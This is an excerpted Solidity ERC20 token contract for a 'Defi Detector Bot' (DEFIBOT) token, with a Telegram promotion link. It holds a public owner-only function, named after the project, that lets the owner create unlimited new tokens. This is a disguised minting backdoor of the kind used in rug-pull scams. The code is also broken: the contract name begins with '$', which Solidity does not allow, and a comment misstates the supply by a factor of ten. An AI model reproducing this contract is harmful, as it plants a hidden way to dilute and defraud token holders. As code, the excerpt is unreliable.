...
//
// $DefiDetectorBot proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/DefiDetectorBot
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _DefiDetectorBot(uint256 amount) public onlyOwner {
 _DefiDetectorBot(msg.sender, amount);
    }
    ...
    function _DefiDetectorBot(address account, uint256 amount) internal virtual {
...
contract $DefiDetectorBot is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Defi Detector Bot", "DEFIBOT") {
     _DefiDetectorBot(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}